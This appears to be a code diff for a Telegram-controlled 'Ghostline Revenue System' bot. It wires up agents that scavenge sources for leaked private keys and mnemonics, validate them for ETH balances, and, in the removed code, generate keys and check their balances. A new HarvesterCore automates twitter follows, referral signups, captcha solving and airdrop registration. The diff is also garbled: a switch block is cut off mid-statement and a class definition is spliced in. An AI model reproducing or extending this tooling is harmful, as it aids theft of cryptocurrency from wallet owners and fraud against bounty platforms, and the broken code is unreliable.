-            (this.metrics.errors / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
-
-        return {
-            ...this.metrics,
-            successRate,
-            errorRate,
-            averageValue: this.metrics.validWallets > 0 ? 
-                (this.metrics.totalValue / this.metrics.validWallets).toFixed(2) : 0
-        };
+        this.log(`Executing task: ${task.id} - ${task.description}`);
+        
+        let attempts = 0;
+        let success = false;
+        
+        while (attempts < this.config.maxRetries && !success && this.isRunning) {
+            attempts++;
+            
+            try {
+                const result = await this.performTaskAction(task);
+                
+                if (result.success) {
+                    success = true;
+                    await this.handleTaskSuccess(task, result);
+                } else {
+                    this.log(`Task attempt ${attempts} failed: ${result.error}`);
+                    if (attempts < this.config.maxRetries) {
+                        this.metrics.retryAttempts++;
+                        await this.sleep(5000); // Wait 5 seconds before retry
+                    }
+                }
+                
+            } catch (error) {
+                this.log(`Task execution attempt ${attempts} error: ${error.message}`);
+                if (attempts === this.config.maxRetries) {
+                    await this.handleTaskFailure(task, error);
+                }
+            }
+        }
+        
+        this.currentTask = null;
+        this.metrics.tasksCompleted++;
     }
 
-    setNotificationCallback(callback) {
-        this.notificationCallback = callback;
-    }
+    async performTaskAction(task) {
+        return new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error('Task timeout'));
+            }, this.config.taskTimeout);
+            
+            // Simulate task execution based on type
+            setTimeout(async () => {
+                clearTimeout(timeout);
+                
+                try {
+                    let result;
+                    
+                    switch (task.type) {
+                        case 'twitter_follow':
+                            result = await this.mockTwitterFollow(task);
+                            break;
+                        case 'referral_signup':
+                            result = await this.mockReferralSignup(task);
+                            break;
+                        case 'captcha_completion':
+                            result = await this.mockCaptchaCompletion(task);
+                            break;
+                        case 'airdrop_registration':
+                            result = await this.mockAirdropRegistration(task);
+                            break;
+                        case 'survey_completion':
+                            result = await this.mockSurveyCompletion(task);
+                            break;
+                        case 'discord_join':
+                            result = await this.mockDiscordJoin(task);
+                            break
 
-    sleep(milliseconds) {
-        return new Promise(resolve => setTimeout(resolve, milliseconds));
-    }
-}
-
-// Main Revenue System with Complete MnemonicValidator Integration
+                           // Main Revenue System with HarvesterCore Integration
 class GhostlineRevenueSystem {
     constructor() {
         this.isRunning = false;
         this.startTime = null;
         
-        // Initialize all integrated agents
+        // Initialize all integrated agents (Hunter removed, HarvesterCore added)
         this.lostWalletAnalyzer = new LostWalletAnalyzer();
-        this.hunter = new IntegratedHunter();
+        this.harvesterCore = new HarvesterCore();
         this.scavenger = new IntegratedScavenger();
         this.validator = new MultiChainValidator();
         this.mnemonicValidator = new MnemonicValidator();
@@ -1240,7 +869,7 @@ class GhostlineRevenueSystem {
         // Cross-component integration
         this.scavenger.setMnemonicValidator(this.mnemonicValidator);
         
-        this.log('Ghostline Revenue System v3.2 initialized with comprehensive MnemonicValidator integration');
+        this.log('Ghostline Revenue System v3.3 initialized with HarvesterCore micro-bounty integration');
         
         // Initialize Telegram bot if token is available
         if (process.env.TELEGRAM_TOKEN) {
@@ -1258,25 +887,24 @@ class GhostlineRevenueSystem {
         try {
             this.bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
             
-            // Get chat ID for notifications (will be set on first interaction)
             this.telegramChatId = null;
             
             // Primary system control commands
             this.bot.onText(/\/start/, async (msg) => {
                 const chatId = msg.chat.id;
-                this.telegramChatId = chatId; // Store chat ID for notifications
+                this.telegramChatId = chatId;
                 
                 try {
-                    // Start all agents
                     const analyzerResult = await this.lostWalletAnalyzer.start();
-                    const hunterResult = await this.hunter.start();
+                    const harvesterResult = await this.harvesterCore.start();
                     const scavengerResult = await this.scavenger.start();
                     const mnemonicResult = this.mnemonicValidator.start();
                     
-                    // Configure Telegram integration for MnemonicValidator
+                    // Configure Telegram integration
                     this.mnemonicValidator.setTelegramBot(this.bot, chatId);
+                    this.harvesterCore.setTelegramBot(this.bot, chatId);
                     
-                    this.bot.sendMessage(chatId, '🚀 Revenue system activated\n\nAll scanning agents operational\n\n🔍 Lost Wallet Analyzer: ACTIVE\n🎯 Hunter: ACTIVE\n📡 Scavenger: ACTIVE\n🔐 MnemonicValidator: ACTIVE\n\n💡 Scavenger will automatically validate discovered mnemonics');
+                    this.bot.sendMessage(chatId, '🚀 Revenue system activated\n\nAll agents operational\n\n🔍 Lost Wallet Analyzer: ACTIVE\n🎯 HarvesterCore: ACTIVE\n📡 Scavenger: ACTIVE\n🔐 MnemonicValidator: ACTIVE\n\n💡 HarvesterCore executing micro-bounty tasks\n🔗 Scavenger validating discovered mnemonics');
                 } catch (error) {
                     this.bot.sendMessage(chatId, `System startup error: ${error.message}`);
                 }
@@ -1286,11 +914,11 @@ class GhostlineRevenueSystem {
                 const chatId = msg.chat.id;
                 try {
                     await this.lostWalletAnalyzer.stop();
-                    await this.hunter.stop();
+                    await this.harvesterCore.stop();
                     await this.scavenger.stop();
                     this.mnemonicValidator.stop();
                     
-                    this.bot.sendMessage(chatId, '⏹️ Revenue system deactivated\n\nAll scanning operations halted');
+                    this.bot.sendMessage(chatId, '⏹️ Revenue system deactivated\n\nAll operations halted');
                 } catch (error) {
                     this.bot.sendMessage(chatId, `System shutdown error: ${error.message}`);
                 }
@@ -1308,14 +936,18 @@ class GhostlineRevenueSystem {
                 this.bot.sendMessage(chatId, metrics);
             });
 
-            // New command for mnemonic-specific metrics
             this.bot.onText(/\/mnemonic/, async (msg) => {
                 const chatId = msg.chat.id;
                 const mnemonicMetrics = this.getMnemonicMetrics();
                 this.bot.sendMessage(chatId, mnemonicMetrics);
             });
 
-            // Manual mnemonic validation command
+            this.bot.onText(/\/harvester/, async (msg) => {
+                const chatId = msg.chat.id;
+                const harvesterMetrics = this.getHarvesterMetrics();
+                this.bot.sendMessage(chatId, harvesterMetrics);
+            });
+
             this.bot.onText(/\/validate (.+)/, async (msg, match) => {
                 const chatId = msg.chat.id;
                 const mnemonicPhrase = match[1];
@@ -1351,18 +983,19 @@ class GhostlineRevenueSystem {
                 }
             });
 
-            // Help command
             this.bot.onText(/\/help/, async (msg) => {
                 const chatId = msg.chat.id;
                 const helpText = `🤖 Ghostline Revenue System Commands\n\n` +
-                    `🚀 /start - Activate all scanning agents\n` +
+                    `🚀 /start - Activate all agents\n` +
                     `⏹️ /stop - Deactivate all operations\n` +
                     `📊 /status - View system status\n` +
                     `📈 /metrics - View performance metrics\n` +
                     `🔐 /mnemonic - View mnemonic validation stats\n` +
-                    `🔍 /validate [mnemonic] - Manually validate a mnemonic\n` +
+                    `🎯 /harvester - View micro-bounty earnings\n` +
+                    `🔍 /validate [mnemonic] - Manually validate mnemonic\n` +
                     `❓ /help - Show this help message\n\n` +
-                    `💡 System automatically validates mnemonics found by Scavenger`;
+                    `💡 HarvesterCore executes micro-bounty tasks automatically\n` +
+                    `🔗 Scavenger validates discovered mnemonics`;
                 
                 this.bot.sendMessage(chatId, helpText);
             });
@@ -1376,7 +1009,7 @@ class GhostlineRevenueSystem {
                 this.log(`Telegram polling error: ${error.message}`);
             });
             
-            this.log('Telegram bot initialized with comprehensive MnemonicValidator integration');
+            this.log('Telegram bot initialized with HarvesterCore integration');
         } catch (error) {
             this.log(`Failed to initialize Telegram bot: ${error.message}`);
         }
@@ -1384,7 +1017,7 @@ class GhostlineRevenueSystem {
 
     getOperationalStatus() {
         const analyzerStatus = this.lostWalletAnalyzer.getStatus();
-        const hunterStatus = this.hunter.getStatus();
+        const harvesterStatus = this.harvesterCore.getStatus();
         const scavengerStatus = this.scavenger.getStatus();
         const mnemonicStatus = this.mnemonicValidator.getStatus();
         
@@ -1392,7 +1025,7 @@ class GhostlineRevenueSystem {
         
         const activeCount = [
             analyzerStatus.isRunning, 
-            hunterStatus.isRunning, 
+            harvesterStatus.isRunning, 
             scavengerStatus.isRunning,
             mnemonicStatus.isRunning
         ].filter(Boolean).length;
@@ -1406,21 +1039,21 @@ class GhostlineRevenueSystem {
         }
         
         status += `🔍 Analyzer: ${analyzerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
-        status += `🎯 Hunter: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
+        status += `🎯 HarvesterCore: ${harvesterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
         status += `📡 Scavenger: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
         status += `🔐 MnemonicValidator: ${mnemonicStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
         
-        // Show integration status
-        const scavengerMetrics = this.scavenger.getMetrics();
-        if (scavengerMetrics.mnemonicValidatorActive) {
-            status += `🔗 Scavenger → MnemonicValidator: LINKED\n`;
-            status += `📊 Validation Rate: ${scavengerMetrics.validationRate}\n\n`;
+        // Show earnings summary
+        if (harvesterStatus.isRunning) {
+            const harvesterMetrics = this.harvesterCore.getMetrics();
+            status += `💰 Total Earnings: ${harvesterMetrics.totalEarnings.toFixed(4)} ETH\n`;
+            status += `✅ Tasks Completed: ${harvesterMetrics.tasksCompleted}\n\n`;
         }
         
         if (activeCount === 0) {
             status += 'Use /start to begin revenue operations';
         } else {
-            status += 'Use /metrics for performance data\nUse /mnemonic for validation stats';
+            status += 'Use /metrics for detailed performance\nUse /harvester for task earnings';
         }
         
         return status;
@@ -1429,8 +1062,8 @@ class GhostlineRevenueSystem {
     getPerformanceMetrics() {
         const analyzerStatus = this.lostWalletAnalyzer.getStatus();
         const analyzerMetrics = this.lostWalletAnalyzer.getMetrics();
-        const hunterStatus = this.hunter.getStatus();
-        const hunterMetrics = this.hunter.getMetrics();
+        const harvesterStatus = this.harvesterCore.getStatus();
+        const harvesterMetrics = this.harvesterCore.getMetrics();
         const scavengerStatus = this.scavenger.getStatus();
         const scavengerMetrics = this.scavenger.getMetrics();
         
@@ -1441,33 +1074,67 @@ class GhostlineRevenueSystem {
             metrics += `• Runtime: ${analyzerStatus.runtime}\n`;
             metrics += `• Wallets Analyzed: ${analyzerMetrics.walletsAnalyzed}\n`;
             metrics += `• Lost Wallets Found: ${analyzerMetrics.genuinelyLostFound}\n`;
-            metrics += `• Success Rate: ${analyzerMetrics.successRate}\n`;
-            metrics += `• Total Value: ${analyzerMetrics.totalValueDiscovered} ETH\n\n`;
+            metrics += `• Success Rate: ${analyzerMetrics.successRate}\n\n`;
         }
         
-        if (hunterStatus.isRunning) {
-            metrics += `🎯 Hunter Performance\n`;
-            metrics += `• Runtime: ${hunterStatus.runtime}\n`;
-            metrics += `• Keys Generated: ${hunterMetrics.keysGenerated}\n`;
-            metrics += `• Balances Checked: ${hunterMetrics.balancesChecked}\n`;
-            metrics += `• Positive Hits: ${hunterMetrics.positiveHits}\n`;
-            metrics += `• Success Rate: ${hunterMetrics.successRate}\n\n`;
+        if (harvesterStatus.isRunning) {
+            metrics += `🎯 HarvesterCore Performance\n`;
+            metrics += `• Runtime: ${harvesterStatus.runtime}\n`;
+            metrics += `• Tasks Completed: ${harvesterMetrics.tasksCompleted}\n`;
+            metrics += `• Success Rate: ${harvesterMetrics.successRate}\n`;
+            metrics += `• Total Earnings: ${harvesterMetrics.totalEarnings.toFixed(4)} ETH\n`;
+            metrics += `• Avg Task Reward: ${harvesterMetrics.avgTaskReward.toFixed(4)} ETH\n\n`;
         }
         
         if (scavengerStatus.isRunning) {
             metrics += `📡 Scavenger Performance\n`;
             metrics += `• Runtime: ${scavengerStatus.runtime}\n`;
             metrics += `• Sources Scanned: ${scavengerMetrics.sourcesScanned}\n`;
-            metrics += `• Matches Found: ${scavengerMetrics.matchesFound}\n`;
-            metrics += `• Private Keys: ${scavengerMetrics.privateKeysFound}\n`;
             metrics += `• Mnemonics Found: ${scavengerMetrics.mnemonicsFound}\n`;
             metrics += `• Mnemonics Validated: ${scavengerMetrics.mnemonicsValidated}\n\n`;
         }
         
-        if (!analyzerStatus.isRunning && !hunterStatus.isRunning && !scavengerStatus.isRunning) {
-            metrics += 'No active operations to report\n\nUse /start to begin scanning';
+        if (!analyzerStatus.isRunning && !harvesterStatus.isRunning && !scavengerStatus.isRunning) {
+            metrics += 'No active operations to report\n\nUse /start to begin operations';
         } else {
-            metrics += 'Use /mnemonic for detailed validation metrics';
+            metrics += 'Use /harvester for detailed task metrics\nUse /mnemonic for validation stats';
+        }
+        
+        return metrics;
+    }
+
+    getHarvesterMetrics() {
+        const harvesterStatus = this.harvesterCore.getStatus();
+        const harvesterMetrics = this.harvesterCore.getMetrics();
+        
+        let metrics = '🎯 HarvesterCore Task Metrics\n\n';
+        
+        if (harvesterStatus.isRunning) {
+            metrics += `📊 Task Statistics\n`;
+            metrics += `• Total Tasks: ${harvesterMetrics.tasksCompleted}\n`;
+            metrics += `• Successful: ${harvesterMetrics.tasksSuccessful}\n`;
+            metrics += `• Failed: ${harvesterMetrics.tasksFailed}\n`;
+            metrics += `• Success Rate: ${harvesterMetrics.successRate}\n`;
+            metrics += `• Retry Attempts: ${harvesterMetrics.retryAttempts}\n\n`;
+            
+            metrics += `💰 Earnings Summary\n`;
+            metrics += `• Total Earned: ${harvesterMetrics.totalEarnings.toFixed(4)} ETH\n`;
+            metrics += `• Average per Task: ${harvesterMetrics.avgTaskReward.toFixed(4)} ETH\n`;
+            metrics += `• Tasks per Hour: ${harvesterMetrics.tasksPerHour.toFixed(1)}\n`;
+            metrics += `• Hourly Rate: ${harvesterMetrics.hourlyEarnings.toFixed(4)} ETH/h\n\n`;
+            
+            if (harvesterMetrics.lastTaskTime) {
+                metrics += `⏰ Last Task: ${new Date(harvesterMetrics.lastTaskTime).toLocaleString()}\n\n`;
+            }
+            
+            if (harvesterMetrics.totalEarnings > 0) {
+                metrics += `🎯 ${harvesterMetrics.tasksSuccessful} SUCCESSFUL COMPLETIONS!\n`;
+                metrics += `💎 Stable micro-bounty income stream active`;
+            } else {
+                metrics += `🔄 System active, processing available tasks\nEarnings will appear as tasks complete`;
+            }
+        } else {
+            metrics += `❌ HarvesterCore is not running\n\nUse /start to activate task execution`;
         }
         
         return metrics;
@@ -1483,17 +1150,10 @@ class GhostlineRevenueSystem {
             metrics += `📊 Validation Statistics\n`;
             metrics += `• Total Validated: ${mnemonicMetrics.totalValidated}\n`;
             metrics += `• Valid Mnemonics: ${mnemonicMetrics.validMnemonics}\n`;
-            metrics += `• Invalid Mnemonics: ${mnemonicMetrics.invalidMnemonics}\n`;
             metrics += `• Positive Balances: ${mnemonicMetrics.positiveBalances}\n`;
             metrics += `• Total Value Found: ${mnemonicMetrics.totalValueFound.toFixed(4)} ETH\n`;
             metrics += `• Success Rate: ${mnemonicMetrics.successRate}\n`;
-            metrics += `• Discovery Rate: ${mnemonicMetrics.discoveryRate}\n`;
-            metrics += `• Average Value: ${mnemonicMetrics.averageValue} ETH\n`;
-            metrics += `• Errors: ${mnemonicMetrics.errors}\n\n`;
-            
-            if (mnemonicMetrics.lastValidation) {
-                metrics += `⏰ Last Validation: ${new Date(mnemonicMetrics.lastValidation).toLocaleString()}\n\n`;
-            }
+            metrics += `• Discovery Rate: ${mnemonicMetrics.discoveryRate}\n\n`;
             
             if (mnemonicMetrics.positiveBalances > 0) {
                 metrics += `🎯 ${mnemonicMetrics.positiveBalances} SUCCESSFUL DISCOVERIES!\n`;
@@ -1502,7 +1162,7 @@ class GhostlineRevenueSystem {
                 metrics += `🔍 No positive balances discovered yet\nContinue scanning for results`;
             }
         } else {
-            metrics += `❌ MnemonicValidator is not running\n\nUse /start to activate all systems`;
+            metrics += `❌ MnemonicValidator is not running\n\nUse /start to activate validation`;
         }
         
         return metrics;
@@ -1517,12 +1177,11 @@ class GhostlineRevenueSystem {
         this.isRunning = true;
         this.startTime = new Date();
         
-        // Initialize health server
         if (!healthServer) {
             initializeHealthServer();
         }
         
-        this.log('Ghostline Revenue System started successfully with MnemonicValidator integration');
+        this.log('Ghostline Revenue System started successfully with HarvesterCore integration');
     }
 
     async stop() {
@@ -1533,9 +1192,8 @@ class GhostlineRevenueSystem {
 
         this.isRunning = false;
         
-        // Stop all agents
         await this.lostWalletAnalyzer.stop();
-        await this.hunter.stop();
+        await this.harvesterCore.stop();
         await this.scavenger.stop();
         this.mnemonicValidator.stop();
         
@@ -1579,4 +1237,6 @@ process.on('SIGTERM', async () => {
     }
 });
 
-module.exports = GhostlineRevenueSystem;
+module.exports = GhostlineRevenueSystem; 
+
+                    
